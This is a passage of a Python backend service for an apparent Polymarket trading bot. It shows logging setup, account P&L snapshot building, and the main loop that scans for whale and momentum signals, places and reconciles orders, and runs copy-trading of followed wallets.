from __future__ import annotations

import asyncio
import contextlib
import io
import json
import logging
import logging.handlers
import os
import random
import sys
import time
import traceback
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

if __name__ == "__main__" and "--mcp" in sys.argv:
    import mcp_stdio
    sys.exit(mcp_stdio.main())


_log_q: asyncio.Queue | None = None


class _StdoutHandler(logging.Handler):

    def emit(self, record: logging.LogRecord) -> None:
        try:
            msg = self.format(record)
        except Exception:
            msg = record.getMessage()
        source = "backend"
        if record.name.startswith("trader"):
            source = "trader"
        elif record.name.startswith("scanner"):
            source = "whale" if "whale" in msg.lower()[:20] else "momentum"
        elif record.name.startswith("discord"):
            source = "discord"
        try:
            evt = {
                "type": "log",
                "level": record.levelname,
                "source": source,
                "msg": msg,
                "ts": datetime.now(timezone.utc).isoformat(),
            }
            sys.stdout.write(json.dumps(evt) + "\n")
            sys.stdout.flush()
        except Exception:
            pass


def _setup_logging() -> None:
    log_dir_base = os.environ.get("KRYPT_POLYBOT_USERDATA")
    if log_dir_base:
        log_dir = Path(log_dir_base) / "logs"
    else:
        log_dir = Path(__file__).resolve().parent / "logs"
    log_dir.mkdir(parents=True, exist_ok=True)
    fmt = logging.Formatter(
        "[%(asctime)s] %(levelname)-7s %(name)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    root = logging.getLogger()
    root.setLevel(logging.INFO)
    fh = logging.handlers.RotatingFileHandler(
        log_dir / "backend.log", maxBytes=10 * 1024 * 1024,
        backupCount=5, encoding="utf-8",
    )
    fh.setFormatter(fmt)
    root.addHandler(fh)
    sh = _StdoutHandler()
    sh.setFormatter(fmt)
    root.addHandler(sh)
    logging.getLogger("httpx").setLevel(logging.WARNING)
    logging.getLogger("httpcore").setLevel(logging.WARNING)


_setup_logging()
logger = logging.getLogger("service")


import db
import polymarket_api
import polymarket_auth
import scanner
import crypto15m
import trader
import crypto15m_trader
import crypto15m_record
import perps_api
import perps_board
import perps_maker
import perps_ws
import user_ws
import data_v2
import activity_ws
import copy_trader
import script_engine
import script_sandbox
import rtds_ws
import spot_ws
from config import DEFAULT_CONFIG, merge_with_defaults


def _iso_utc(s: Any) -> Any:
    if not s:
        return s
    if not isinstance(s, str):
        return s
    s = s.strip()
    if not s:
        return s
    if s.endswith("Z") or "+" in s[10:] or s.count("-") > 2:
        return s.replace(" ", "T")
    return s.replace(" ", "T") + "Z"


class State:
    cfg: dict[str, Any] = dict(DEFAULT_CONFIG)
    auth_ok: bool = False
    paused: bool = False
    last_whale_scan_at: str | None = None
    last_momentum_scan_at: str | None = None
    last_trade_scan_at: str | None = None
    started_at: str = ""
    active_run_id: int = 0
    unredeemed_winnings_usd: float = 0.0
    unredeemed_winnings_count: int = 0
    unredeemed_since: float = 0.0


STATE = State()


_stdout_lock = asyncio.Lock()


async def _send(obj: dict) -> None:
    line = json.dumps(obj, default=str) + "\n"
    async with _stdout_lock:
        out = sys.stdout
        out.write(line)
        if not getattr(out, "line_buffering", False):
            out.flush()


async def emit_event(name: str, data: Any = None) -> None:
    await _send({"type": "event", "name": name, "data": data})


async def respond_ok(req_id: str, result: Any = None) -> None:
    await _send({"type": "rpc", "id": req_id, "ok": True, "result": result})


async def respond_err(req_id: str, msg: str) -> None:
    await _send({"type": "rpc", "id": req_id, "ok": False, "error": msg})


async def _build_account_snapshot() -> dict:
    env = polymarket_auth.get_env()
    cash_cents = port_cents = 0
    try:
        cents, port = await trader.refresh_balance(STATE.cfg, force=False)
        cash_cents = cents
        port_cents = port
    except Exception:
        pass
    cash_usd = cash_cents / 100.0
    port_usd = port_cents / 100.0
    total = cash_usd + port_usd

    user_start = float(STATE.cfg.get("start_bankroll_usd", 0.0) or 0.0)
    if user_start > 0:
        baseline = user_start
        baseline_source = "user"
    else:
        with db.get_db() as conn:
            earliest = db.earliest_pnl_total(conn, env)
        if earliest and earliest > 0:
            baseline = earliest
            baseline_source = "auto"
        else:
            baseline = total if total > 0 else 0.0
            baseline_source = "live"

    with db.get_db() as conn:
        stats_env = db.aggregate_stats(conn, env)
        balance_syncing = db.recent_balance_transition(conn, env)
    wl = stats_env["wins"] + stats_env["losses"]
    wr = (stats_env["wins"] / wl * 100.0) if wl else 0.0
    open_cost = stats_env["open_cost"]
    unrealized = port_usd - open_cost

    with db.get_db() as conn:
        first_today = db.first_snapshot_of_today(conn, env)
        bankroll_baseline_snap = db.earliest_pnl_total(conn, env)
        active_run = db.get_active_run(conn, env) if STATE.active_run_id else None
        today_transfers = db.transfer_adjustment_today(conn, env)
        alltime_transfers = db.transfer_adjustment_total(conn, env)
        session_transfers = (
            db.transfer_adjustment_run(conn, env, int(active_run.get("id") or 0))
            if active_run else 0.0
        )

    today_balance_baseline = (
        float(first_today["total_usd"]) if first_today else None
    )
    today_balance_pnl = (
        total - today_balance_baseline - today_transfers
        if today_balance_baseline is not None else 0.0
    )
    alltime_balance_baseline = (
        float(bankroll_baseline_snap)
        if bankroll_baseline_snap is not None else baseline
    )
    alltime_balance_pnl = total - alltime_balance_baseline - alltime_transfers
    roi = (
        (alltime_balance_pnl / alltime_balance_baseline * 100.0)
        if alltime_balance_baseline > 0 else 0.0
    )

    if active_run:
        session_baseline = float(active_run.get("start_total_usd") or 0.0)
        session_started_at = _iso_utc(
            active_run.get("started_at") or STATE.started_at
        )
        session_run_id = int(active_run.get("id") or 0)
    else:
        session_baseline = total
        session_started_at = STATE.started_at
        session_run_id = 0
    session_pnl = (
        total - session_baseline - session_transfers
        if session_baseline > 0 else 0.0
    )
    session_roi = (
        (session_pnl / session_baseline * 100.0)
        if session_baseline > 0 else 0.0
    )

    return {
        "cashUsd": cash_usd,
        "portfolioUsd": port_usd,
        "totalUsd": total,
        "balanceSyncing": balance_syncing,
        "tradingGeoblocked": polymarket_api.geoblock_active(),
        "tradingRestriction": polymarket_api.trading_restriction(),
        "userFeed": user_ws.feed.status(),
        "startBankrollUsd": baseline,
        "bankrollSource": baseline_source,
        "roiPct": roi,
        "realizedPnlUsd": stats_env["realized_pnl"],
        "todayPnlUsd": today_balance_pnl,
        "alltimePnlUsd": alltime_balance_pnl,
        "todayBaselineUsd": today_balance_baseline,
        "alltimeBaselineUsd": alltime_balance_baseline,
        "sessionPnlUsd": session_pnl,
        "sessionRoiPct": session_roi,
        "sessionBaselineUsd": session_baseline,
        "sessionStartedAt": session_started_at,
        "sessionRunId": session_run_id,
        "todayWins": stats_env["today_wins"],
        "todayLosses": stats_env["today_losses"],
        "unrealizedPnlUsd": unrealized,
        "openCostUsd": open_cost,
        "unredeemedWinningsUsd": STATE.unredeemed_winnings_usd,
        "unredeemedWinningsCount": STATE.unredeemed_winnings_count,
        "unredeemedWinningsStale": bool(
            STATE.unredeemed_since
            and STATE.unredeemed_winnings_usd >= 1.0
            and (asyncio.get_event_loop().time() - STATE.unredeemed_since) >= 300.0
        ),
        "feesUsd": stats_env["fees"],
        "wins": stats_env["wins"],
        "losses": stats_env["losses"],
        "winRate": wr,
        "pendingCount": stats_env["pending"],
        "openCount": stats_env["open_filled"],
        "resolvedCount": stats_env["resolved_count"],
        "totalOpened": stats_env["total_opened"],
        "byNetwork": {
            "mainnet": {
                "wins": stats_env["wins"],
                "losses": stats_env["losses"],
                "realizedPnl": stats_env["realized_pnl"],
            },
        },
    }


def _live_pnl_usd(r: dict) -> float | None:
    if r.get("resolved"):
        return None
    mark = r.get("mark_price_cents")
    if mark is None:
        return None
    filled = int(r.get("filled_contracts") or 0)
    if filled <= 0:
        return None
    market_value = filled * float(mark) / 100.0
    return round(market_value - float(r.get("cost_usd") or 0.0), 2)


def _position_row_to_js(r: dict) -> dict:
    return {
        "id": int(r["id"]),
        "signalSource": r["signal_source"],
        "signalId": int(r["signal_id"]),
        "ticker": r["ticker"],
        "eventTicker": r.get("event_ticker") or "",
        "title": r.get("title") or "",
        "category": r.get("category") or "",
        "direction": r["direction"],
        "action": r.get("action") or "buy",
        "targetContracts": int(r.get("target_contracts") or 0),
        "limitPriceCents": int(r.get("limit_price_cents") or 0),
        "filledContracts": int(r.get("filled_contracts") or 0),
        "avgFillPriceCents": (
            float(r["avg_fill_price_cents"])
            if r.get("avg_fill_price_cents") is not None
            else None
        ),
        "costUsd": float(r.get("cost_usd") or 0),
        "feesUsd": float(r.get("fees_usd") or 0),
        "clientOrderId": r.get("client_order_id") or "",
        "orderId": r.get("order_id"),
        "status": r["status"],
        "confidence": float(r.get("confidence") or 0),
        "edgePts": float(r.get("edge_pts") or 0),
        "signalPriceCents": float(r.get("signal_price") or 0),
        "resolved": bool(r.get("resolved") or 0),
        "outcomeCorrect": (
            int(r["outcome_correct"])
            if r.get("outcome_correct") is not None
            else None
        ),
        "settlementUsd": (
            float(r["settlement_usd"])
            if r.get("settlement_usd") is not None
            else None
        ),
        "pnlUsd": float(r["pnl_usd"]) if r.get("pnl_usd") is not None else None,
        "markPriceCents": (
            float(r["mark_price_cents"])
            if r.get("mark_price_cents") is not None
            else None
        ),
        "livePnlUsd": _live_pnl_usd(r),
        "balanceBeforeUsd": (
            float(r["balance_before_usd"])
            if r.get("balance_before_usd") is not None
            else None
        ),
        "network": r.get("network") or "mainnet",
        "createdAt": _iso_utc(r.get("created_at")) or "",
        "lastUpdated": _iso_utc(r.get("last_updated")) or "",
        "resolvedAt": _iso_utc(r.get("resolved_at")),
        "error": r.get("error"),
    }


def _signal_row_to_js(r: dict, source: str, traded: bool) -> dict:
    if source == "whale":
        price_frac = float(r.get("price") or 0)
        price_c = int(round(price_frac * 100))
        return {
            "id": int(r["id"]),
            "source": "whale",
            "ticker": r["ticker"],
            "eventTicker": r.get("event_ticker") or "",
            "title": r.get("title") or r.get("ticker", ""),
            "category": r.get("category") or "",
            "direction": (r.get("taker_side") or "yes").lower(),
            "priceCents": price_c,
            "confidence": float(r.get("confidence") or 0),
            "edgePts": float(r.get("confidence") or 0) - price_c,
            "dollarValue": float(r.get("dollar_value") or 0),
            "createdAt": _iso_utc(r.get("created_at")) or "",
            "resolved": bool(r.get("resolved") or 0),
            "outcomeCorrect": (
                int(r["outcome_correct"])
                if r.get("outcome_correct") is not None
                else None
            ),
            "pnlEstimate": (
                float(r["pnl_estimate"])
                if r.get("pnl_estimate") is not None
                else None
            ),
            "traded": traded,
        }
    direction = (r.get("direction") or "yes").lower()
    price_frac = float(r.get("price") or 0)
    yes_c = int(round(price_frac * 100))
    cost_c = yes_c if direction == "yes" else max(0, 100 - yes_c)
    implied = yes_c if direction == "yes" else 100 - yes_c
    return {
        "id": int(r["id"]),
        "source": "momentum",
        "ticker": r["ticker"],
        "eventTicker": r.get("event_ticker") or "",
        "title": r.get("title") or r.get("ticker", ""),
        "category": r.get("category") or "",
        "direction": direction,
        "priceCents": cost_c,
        "confidence": float(r.get("confidence") or 0),
        "edgePts": float(r.get("confidence") or 0) - implied,
        "signalType": r.get("signal_type") or "",
        "createdAt": _iso_utc(r.get("created_at")) or "",
        "resolved": bool(r.get("resolved") or 0),
        "outcomeCorrect": (
            int(r["outcome_correct"])
            if r.get("outcome_correct") is not None
            else None
        ),
        "pnlEstimate": (
            float(r["pnl_estimate"])
            if r.get("pnl_estimate") is not None
            else None
        ),
        "traded": traded,
    }


_loop_task: asyncio.Task | None = None
_loop_stop: asyncio.Event | None = None
_watchdog_task: asyncio.Task | None = None
_loop_heartbeat: float = 0.0
_LOOP_STALL_SEC = 240.0
_WATCHDOG_CHECK_SEC = 20.0

_copy_task: asyncio.Task | None = None
_copy_heartbeat: float = 0.0
_crypto_task: asyncio.Task | None = None
_crypto_heartbeat: float = 0.0
_perps_task: asyncio.Task | None = None
_perps_heartbeat: float = 0.0
_PERPS_FAST_MIN_SEC = 0.2
_copy_wake: asyncio.Event | None = None
_ENGINE_STALL_SEC = 120.0

_ENGINE_LOOPS: tuple[tuple[str, str, str, str, str], ...] = (
    ("trading", "_loop_task", "_loop_heartbeat",
     "_scanner_and_trader_loop", "_LOOP_STALL_SEC"),
    ("copy", "_copy_task", "_copy_heartbeat",
     "_copy_loop", "_ENGINE_STALL_SEC"),
    ("crypto15m", "_crypto_task", "_crypto_heartbeat",
     "_crypto15m_loop", "_ENGINE_STALL_SEC"),
    ("perps", "_perps_task", "_perps_heartbeat",
     "_perps_loop", "_ENGINE_STALL_SEC"),
)
_loop_restart_state: dict[str, dict] = {}
_LOOP_RESTART_BACKOFF_MAX = 60.0

_bg_tasks: set[asyncio.Task] = set()


def _fire_and_forget(coro) -> None:
    async def _quiet():
        try:
            await coro
        except Exception:
            pass
    try:
        t = asyncio.get_event_loop().create_task(_quiet())
    except RuntimeError:
        coro.close()
        return
    _bg_tasks.add(t)
    t.add_done_callback(_bg_tasks.discard)


_socket_whale_inflight: set[str] = set()


def _whale_collection_on(cfg: dict) -> bool:
    return (
        bool(cfg.get("main_record_signals", True))
        or bool(cfg.get("enable_trading"))
        or script_engine.needs_signal_feed()
    )


async def _emit_whale_batch(rows: list[dict]) -> None:
    if not rows:
        return
    with db.get_db() as conn:
        seen = db.already_traded_signal_ids(conn, "whale", polymarket_auth.get_env())
    batch = [
        _signal_row_to_js(row, "whale", int(row["id"]) in seen) for row in rows
    ]
    if batch:
        await emit_event("signal:batch", {"signals": batch})


async def _handle_socket_whale(trade: dict) -> None:
    tid = str(trade.get("trade_id") or "")
    try:
        cnt, rows = await scanner.process_whale_trades(STATE.cfg, [trade])
        if not rows:
            return
        logger.info(f"whale (activity ws): {cnt} new — {trade.get('ticker', '')}")
        STATE.last_whale_scan_at = datetime.now(timezone.utc).isoformat()
        await _emit_whale_batch(rows)
    except Exception as e:
        logger.debug(f"socket whale handling failed: {e}")
    finally:
        _socket_whale_inflight.discard(tid)


def _wake_copy(reason: str = "") -> None:
    ev = _copy_wake
    if ev is None:
        return
    try:
        ev.set()
    except Exception as e:
        logger.debug(f"copy wake ({reason}) failed: {e}")


def _wake_copy_if_followed(cfg: dict, raw: dict) -> None:
    try:
        wallets = cfg.get("copy_wallets") or []
        if not wallets or not cfg.get("copy_enabled"):
            return
        w = str(raw.get("proxyWallet") or "").strip().lower()
        if not w:
            return
        for x in wallets:
            if str(x).strip().lower() == w:
                _wake_copy("activity push")
                return
    except Exception as e:
        logger.debug(f"copy wake check: {e}")


def _on_activity_trade(raw: dict) -> None:
    try:
        cfg = STATE.cfg
        if hasattr(copy_trader, "on_activity_trade"):
            copy_trader.on_activity_trade(raw)
            _wake_copy_if_followed(cfg, raw)

        trade = polymarket_api.normalize_activity_trade(raw)
        if not trade:
            return
        if not (bool(cfg.get("whale_activity_ws", True)) and _whale_collection_on(cfg)):
            return
        if scanner.whale_candidate(trade, cfg) is None:
            return
        tid = str(trade.get("trade_id") or "")
        if not tid or tid in _socket_whale_inflight:
            return
        _socket_whale_inflight.add(tid)
        _fire_and_forget(_handle_socket_whale(trade))
    except Exception as e:
        logger.debug(f"activity trade hook: {e}")


_market_sync_task: asyncio.Task | None = None


def _start_market_sync(max_pages: int = 10) -> bool:
    global _market_sync_task
    if _market_sync_task and not _market_sync_task.done():
        try:
            alive = _market_sync_task.get_loop() is asyncio.get_event_loop()
        except RuntimeError:
            alive = True
        if alive:
            return False

    async def _run() -> None:
        try:
            cnt = await scanner.sync_markets(max_pages=max_pages)
            logger.debug(f"market sync: {cnt} markets")
        except Exception as e:
            logger.warning(f"market sync failed: {e}")

    try:
        _market_sync_task = asyncio.get_event_loop().create_task(_run())
    except RuntimeError:
        return False
    _bg_tasks.add(_market_sync_task)
    _market_sync_task.add_done_callback(_bg_tasks.discard)
    return True


_loop_block_ms: dict[str, float] = {}
_BLOCK_CEILING_SEC = 60.0
_BLOCK_SLOW_SEC = 5.0


@contextlib.asynccontextmanager
async def _block(name: str, ceiling_sec: float = _BLOCK_CEILING_SEC):
    t0 = time.perf_counter()
    timed_out = False
    try:
        async with asyncio.timeout(ceiling_sec):
            yield
    except asyncio.TimeoutError:
        timed_out = True
    finally:
        ms = (time.perf_counter() - t0) * 1000.0
        _loop_block_ms[name] = round(ms, 1)
        if timed_out:
            logger.warning(
                f"[loop] block '{name}' hit its {ceiling_sec:.0f}s ceiling and was "
                "skipped this tick (the loop continues with the next block)"
            )
        elif ms >= _BLOCK_SLOW_SEC * 1000.0:
            logger.warning(f"[loop] block '{name}' took {ms / 1000.0:.1f}s")
        else:
            logger.debug(f"[loop] block '{name}' {ms:.0f}ms")




async def _on_crypto15m_auto_off(info: dict) -> None:
    try:
        STATE.cfg["crypto15m_enabled"] = False
    except Exception:
        pass
    gained = float(info.get("gained") or 0.0)
    target = float(info.get("target") or 0.0)
    logger.info(
        f"crypto15m overall take-profit hit (gained ${gained:+.2f} >= "
        f"${target:.2f}); engine turned OFF"
    )
    await emit_event("crypto15m:autoOff", {
        "reason": info.get("reason") or "take_profit_total",
        "gained": gained,
        "target": target,
    })
    try:
        await emit_event("account:update", await _build_account_snapshot())
    except Exception:
        pass


async def _scanner_and_trader_loop() -> None:
    global _loop_heartbeat
    _loop_heartbeat = asyncio.get_event_loop().time()
    last_whale = 0.0
    last_momentum = 0.0
    last_trade = 0.0
    last_poll = 0.0
    last_resolve = 0.0
    last_market_sync = 0.0
    last_event_sync = 0.0
    last_account_emit = 0.0
    last_pnl_persist = 0.0
    last_reconcile = 0.0
    last_external_exits = 0.0
    last_tp_sweep = 0.0
    last_auth_retry = 0.0
    last_crypto15m_record = 0.0
    last_script = 0.0
    last_redeem_check = 0.0
    last_cleanup = 0.0
    last_standing = 0.0
    last_paper = 0.0
    last_remote = 0.0
    last_mcp = 0.0

    try:
        cnt = await scanner.sync_markets(max_pages=10)
        logger.info(f"Initial market sync: {cnt} markets")
        last_market_sync = asyncio.get_event_loop().time()
    except Exception as e:
        logger.warning(f"initial market sync failed: {e}")

    while not (_loop_stop and _loop_stop.is_set()):
        now = asyncio.get_event_loop().time()
        _loop_heartbeat = now
        cfg = STATE.cfg

        if STATE.paused:
            await asyncio.sleep(1)
            continue

        try:
            async with _block("auth"):
                if (
                    not STATE.auth_ok
                    and polymarket_auth.credentials_present()
                    and now - last_auth_retry >= 15
                ):
                    last_auth_retry = now
                    if await _establish_auth(retries=1):
                        STATE.auth_ok = True
                        logger.info("auth recovered (was transiently disconnected)")
                        await emit_event("backend:authChanged", {"authOk": True})
        except Exception as e:
            logger.debug(f"auth self-heal failed: {e}")

        try:
            async with _block("marketSync", 120.0):
                if now - last_market_sync >= float(cfg.get("market_refresh_interval", 300)):
                    if _start_market_sync(max_pages=10):
                        last_market_sync = now
                if now - last_event_sync >= 600:
                    await scanner.sync_events()
                    last_event_sync = now
        except Exception as e:
            logger.warning(f"sync error: {e}")

        collect_main = _whale_collection_on(cfg)

        try:
            async with _block("whaleScan"):
                if collect_main and now - last_whale >= float(cfg.get("whale_scan_interval", 120)):
                    cnt, rows = await scanner.scan_whales(cfg)
                    last_whale = now
                    STATE.last_whale_scan_at = datetime.now(timezone.utc).isoformat()
                    if cnt:
                        logger.info(f"whale scan: {cnt} new")
                    await _emit_whale_batch(rows)
        except Exception as e:
            logger.warning(f"whale scan error: {e}")

        try:
            async with _block("momentumScan"):
                if collect_main and now - last_momentum >= float(cfg.get("momentum_scan_interval", 90)):
                    cnt, rows = await scanner.scan_momentum(cfg)
                    last_momentum = now
                    STATE.last_momentum_scan_at = datetime.now(timezone.utc).isoformat()
                    if cnt:
                        logger.info(f"momentum scan: {cnt} new")
                    with db.get_db() as conn:
                        seen = db.already_traded_signal_ids(
                            conn, "momentum", polymarket_auth.get_env()
                        )
                    batch = [
                        _signal_row_to_js(row, "momentum", int(row["id"]) in seen)
                        for row in rows
                    ]
                    if batch:
                        await emit_event("signal:batch", {"signals": batch})
        except Exception as e:
            logger.warning(f"momentum scan error: {e}")

        try:
            async with _block("tradeScan"):
                if (
                    STATE.auth_ok
                    and now - last_trade >= float(cfg.get("trade_scan_interval", 20))
                ):
                    placed = await trader.scan_for_trades(cfg)
                    last_trade = now
                    STATE.last_trade_scan_at = datetime.now(timezone.utc).isoformat()
                    for row in placed:
                        js = _position_row_to_js(row)
                        await emit_event("position:new", js)
        except Exception as e:
            logger.error(f"trade scan error: {e}", exc_info=True)

        try:
            async with _block("orderPoll"):
                if (
                    STATE.auth_ok
                    and now - last_poll >= float(cfg.get("position_poll_interval", 30))
                ):
                    updated = await trader.poll_open_orders(cfg)
                    last_poll = now
                    if any(r.get("status") in ("filled", "partial") for r in updated):
                        last_reconcile = 0.0
                        try:
                            await trader.refresh_balance(cfg, force=True)
                            await emit_event("account:update", await _build_account_snapshot())
                        except Exception as e:
                            logger.debug(f"post-fill balance refresh failed: {e}")
                    for row in updated:
                        js = _position_row_to_js(row)
                        await emit_event("position:update", js)
        except Exception as e:
            logger.error(f"poll error: {e}", exc_info=True)

        try:
            async with _block("unredeemed"):
                if STATE.auth_ok and now - last_redeem_check >= 180.0:
                    last_redeem_check = now
                    settled = await polymarket_api.get_settled_positions()
                    total = sum(
                        abs(float(p.get("position_fp") or 0)) * float(p.get("cur_price") or 0)
                        for p in settled
                    )
                    STATE.unredeemed_winnings_usd = round(total, 2)
                    STATE.unredeemed_winnings_count = len(settled)
                    if total >= 1.0:
                        if not STATE.unredeemed_since:
                            STATE.unredeemed_since = now
                    else:
                        STATE.unredeemed_since = 0.0
        except Exception as e:
            logger.debug(f"unredeemed-winnings check failed: {e}")

        try:
            async with _block("reconcile"):
                if STATE.auth_ok and now - last_reconcile >= 30:
                    summary, changed = await trader.reconcile_positions_with_polymarket()
                    last_reconcile = now
                    if any(summary.values()):
                        logger.info(f"reconcile: {summary}")
                        await emit_event("backend:reconciled", summary)
                    for row in changed:
                        await emit_event(
                            "position:update", _position_row_to_js(row),
                        )
        except Exception as e:
            logger.debug(f"periodic reconcile failed: {e}")

        try:
            async with _block("externalExits"):
                if STATE.auth_ok and now - last_external_exits >= 600:
                    last_external_exits = now
                    ext_rows = await trader.detect_external_exits(cfg)
                    for row in ext_rows:
                        await emit_event("position:update", _position_row_to_js(row))
                    if ext_rows:
                        logger.info(f"external exits: booked {len(ext_rows)} position(s)")
        except Exception as e:
            logger.debug(f"periodic external-exit sweep failed: {e}")

        try:
            async with _block("takeProfit"):
                if STATE.auth_ok and now - last_tp_sweep >= 30:
                    last_tp_sweep = now
                    tp_rows = await trader.take_profit_sweep(cfg)
                    for row in tp_rows:
                        await emit_event("position:update", _position_row_to_js(row))
                    if tp_rows:
                        logger.info(f"take-profit: cashed out {len(tp_rows)} position(s)")
        except Exception as e:
            logger.debug(f"periodic take-profit sweep failed: {e}")

        try:
            async with _block("resolution"):
                if (
                    STATE.auth_ok
                    and now - last_resolve >= float(cfg.get("resolution_check_interval", 300))
                ):
                    resolved_pos = await trader.mark_resolved_positions(cfg)
                    await scanner.resolve_alerts_from_markets()
                    await scanner.resolve_whales_from_markets()
                    last_resolve = now
                    for row in resolved_pos:
                        js = _position_row_to_js(row)
                        await emit_event("position:update", js)
        except Exception as e:
            logger.error(f"resolution error: {e}", exc_info=True)

        try:
            async with _block("scripts"):
                if (
                    STATE.auth_ok
                    and now - last_script >= float(cfg.get("script_poll_sec", 5))
                ):
                    await script_engine.run_tick(cfg, authed=STATE.auth_ok)
                    last_script = now
        except Exception as e:
            logger.error(f"script engine tick error: {e}", exc_info=True)

        try:
            async with _block("activityWs"):
                copy_on = (
                    bool(cfg.get("copy_enabled"))
                    and bool(cfg.get("copy_wallets") or [])
                )
                want_ws = (
                    (copy_on and bool(cfg.get("copy_activity_ws", True)))
                    or (collect_main and bool(cfg.get("whale_activity_ws", True)))
                )
                if want_ws:
                    activity_ws.set_trade_hook(_on_activity_trade)
                    if not activity_ws.is_running():
                        activity_ws.start()
                    activity_ws.set_watch(
                        (cfg.get("copy_wallets") or []) if copy_on else []
                    )
                elif activity_ws.is_running():
                    await activity_ws.stop()
        except Exception as e:
            logger.debug(f"activity_ws lifecycle: {e}")

        try:
            async with _block("crypto15mRecord"):
                if (
                    cfg.get("crypto15m_record_signals", True)
                    and now - last_crypto15m_record >= 25
                ):
                    await crypto15m_record.record_tick(cfg)
                    last_crypto15m_record = now
        except Exception as e:
            logger.debug(f"crypto15m record error: {e}")

        try:
            async with _block("dbMaintenance", 120.0):
                if now - last_cleanup >= float(cfg.get("db_cleanup_interval", 3600)):
                    summary = await asyncio.get_event_loop().run_in_executor(
                        None, db.run_maintenance
                    )
                    if summary.get("deleted") or summary.get("vacuumed"):
                        logger.info(
                            f"db maintenance: pruned {summary['deleted']} rows, "
                            f"vacuumed={summary['vacuumed']} "
                            f"(reclaimable {summary['reclaimable_mb']}MB)"
                        )
                    last_cleanup = now
        except Exception as e:
            logger.warning(f"db maintenance failed: {e}")

        try:
            async with _block("accountSnapshot"):
                if now - last_account_emit >= 15:
                    snap = await _build_account_snapshot()
                    if STATE.auth_ok:
                        with db.get_db() as conn:
                            if now - last_pnl_persist >= 60:
                                try:
                                    moved = db.note_transfer_if_unexplainable(
                                        conn,
                                        polymarket_auth.get_env(),
                                        snap["totalUsd"],
                                        run_id=int(STATE.active_run_id or 0),
                                    )
                                    if moved:
                                        kind = "deposit" if moved > 0 else "withdrawal"
                                        logger.warning(
                                            f"[balance] {kind} of ${abs(moved):.2f} detected — "
                                            "excluded from today/session/all-time P&L "
                                            "and the daily stop"
                                        )
                                except Exception as e:
                                    logger.debug(f"transfer detection failed: {e}")
                                db.insert_pnl_snapshot(
                                    conn,
                                    cash_usd=snap["cashUsd"],
                                    portfolio_usd=snap["portfolioUsd"],
                                    realized_pnl_usd=snap["realizedPnlUsd"],
                                    wins=snap["wins"], losses=snap["losses"],
                                    open_positions=snap["openCount"] + snap["pendingCount"],
                                    env=polymarket_auth.get_env(),
                                )
                                last_pnl_persist = now
                            if STATE.active_run_id:
                                db.heartbeat_bot_run(
                                    conn, STATE.active_run_id,
                                    cash_usd=snap["cashUsd"],
                                    portfolio_usd=snap["portfolioUsd"],
                                    lifetime_trades=snap["totalOpened"],
                                    lifetime_wins=snap["wins"],
                                    lifetime_losses=snap["losses"],
                                )
                    await emit_event("account:update", snap)
                    last_account_emit = now
        except Exception as e:
            logger.debug(f"account snapshot error: {e}")

        try:
            async with _block("standing"):
                if now - last_standing >= 10:
                    last_standing = now
                    import terminal_trade
                    res = await terminal_trade.standing_tick(
                        allow_trading=True,
                        paper=bool(cfg.get("terminal_paper_mode")))
                    for a in res.get("alerts") or []:
                        await emit_event("terminal:standing", a)
                        try:
                            import remote
                            await remote.push(
                                ("BLOCKED: " if a.get("blocked") else "FIRED: ")
                                + f"{a.get('kind')} on "
                                + f"{a.get('title') or a.get('conditionId')} at "
                                + f"{a.get('priceCents')}c "
                                + f"(trigger {a.get('triggerCents')}c). "
                                + (a.get("result") or ""))
                        except Exception:
                            pass
                        if a.get("blocked"):
                            logger.warning(
                                "Terminal stop for %s hit %.1fc but live trading is "
                                "off - nothing was sold.",
                                (a.get("title") or a.get("conditionId") or "?"),
                                float(a.get("priceCents") or 0.0))
        except Exception as e:
            logger.debug(f"standing-instruction tick error: {e}")

        try:
            async with _block("remote"):
                if now - last_remote >= 20:
                    last_remote = now
                    await _remote_sync()
        except Exception as e:
            logger.debug(f"remote sync error: {e}")

        try:
            async with _block("mcp"):
                if now - last_mcp >= 10:
                    last_mcp = now
                    await _mcp_sync()
        except Exception as e:
            logger.debug(f"mcp sync error: {e}")

        try:
            async with _block("paperBook"):
                if now - last_paper >= 15:
                    last_paper = now
                    import terminal_paper
                    await terminal_paper.tick()
                    import mcp_tools
                    await mcp_tools.paper_standing_tick()
        except Exception as e:
            logger.debug(f"paper tick error: {e}")

        await asyncio.sleep(1)


async def _engine_supervisor(name: str, body, heartbeat_attr: str) -> None:
    delay = 1.0
    while not (_loop_stop and _loop_stop.is_set()):
        started = asyncio.get_event_loop().time()
        try:
            await body()
            return
        except asyncio.CancelledError:
            raise
        except BaseException as e:
            if asyncio.get_event_loop().time() - started >= 60.0:
                delay = 1.0
            logger.critical(
                f"[{name}] engine loop crashed ({e!r}) - restarting in "
                f"{delay:.0f}s", exc_info=True,
            )
            deadline = asyncio.get_event_loop().time() + delay
            while asyncio.get_event_loop().time() < deadline:
                if _loop_stop and _loop_stop.is_set():
                    return
                globals()[heartbeat_attr] = asyncio.get_event_loop().time()
                await asyncio.sleep(min(1.0, delay))
            delay = min(_LOOP_RESTART_BACKOFF_MAX, delay * 2)


async def _copy_loop() -> None:
    await _engine_supervisor("copy", _copy_loop_body, "_copy_heartbeat")


async def _copy_loop_body() -> None:
    global _copy_heartbeat
    _copy_heartbeat = asyncio.get_event_loop().time()
    last_copy = 0.0
    copy_hot_until = 0.0
    while not (_loop_stop and _loop_stop.is_set()):
        now = asyncio.get_event_loop().time()
        _copy_heartbeat = now
        cfg = STATE.cfg

        if STATE.paused:
            await _copy_sleep(1.0)
            continue

        copy_on = bool(cfg.get("copy_enabled")) and bool(cfg.get("copy_wallets") or [])
        try:
            async with _block("copy:drain"):
                if hasattr(copy_trader, "drain_pushed_entries"):
                    await copy_trader.drain_pushed_entries(cfg, authed=STATE.auth_ok)
        except Exception as e:
            logger.error(f"copy drain error: {e}", exc_info=True)

        if not copy_on:
            try:
                if activity_ws.has_hits():
                    activity_ws.drain_hits()
            except Exception as e:
                logger.debug(f"copy hit drain (disabled): {e}")
            await _copy_sleep(1.0)
            continue

        try:
            async with _block("copy:tick"):
                base_iv = float(cfg.get("copy_poll_sec", 30))
                fast_iv = float(cfg.get("copy_fast_poll_sec", 5))
                if activity_ws.has_hits():
                    hits = activity_ws.drain_hits()
                    copy_hot_until = now + 45.0
                    sells = sum(1 for h in hits if h.get("side") == "SELL")
                    logger.info(
                        f"[copy] activity push: {len(hits)} trade(s) by followed "
                        f"wallets ({sells} sell) - ticking now"
                    )
                    due = now - last_copy >= 1.0
                else:
                    iv = base_iv
